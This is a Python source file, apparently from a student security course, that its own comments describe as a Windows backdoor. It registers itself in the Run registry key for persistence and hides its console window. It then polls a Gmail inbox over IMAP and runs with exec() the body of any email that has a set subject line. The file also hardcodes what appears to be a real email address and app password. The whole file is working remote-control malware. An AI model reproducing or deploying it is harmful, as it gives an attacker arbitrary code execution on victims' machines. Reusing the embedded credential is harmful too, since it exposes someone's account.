# This program provides a backdoor to the system that its on, at startup it checks the attackers email
# For any new instructions then executes them
import email
import imaplib
import os
import sys
from winreg import *

import win32console
import win32gui


def run_in_background():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "backdoor.py", 0, REG_SZ, new_file_path)
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)


run_in_background()

# The email retrieval was inspired by tripleee's response on
# https://stackoverflow.com/questions/53827488/reading-unread-emails-using-python-script
your_email = "comp6841student@gmail.com"
your_email_pass = "fcfn euzu phly qzsb "

mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(your_email, your_email_pass)
mail.select("inbox")
# Get all unseen emails
_, data = mail.search(None, "ALL")
mail_ids = data[0]

id_list = mail_ids.split()
# check if there are any emails
if not id_list:
    exit()


first_email_id = int(id_list[0])
latest_email_id = int(id_list[-1])
# loop through all unseen emails
for i in range(latest_email_id, first_email_id - 1, -1):
    _, data = mail.fetch(str(i), "(RFC822)")
    for response_part in data:
        if isinstance(response_part, tuple):
            msg = email.message_from_bytes(response_part[1])
            # Email subject matches format of log emails from keylogger
            if (
                msg["subject"] == "Backdoor execute instruction"
                and msg["from"] == your_email
            ):
                data = msg.get_payload()
                # Executes whatever was received, could for example execute instructions to delete one of the users files,
                # or create a new file containing even more malware, replace an existing file, etc.
                exec(data)
                exit()
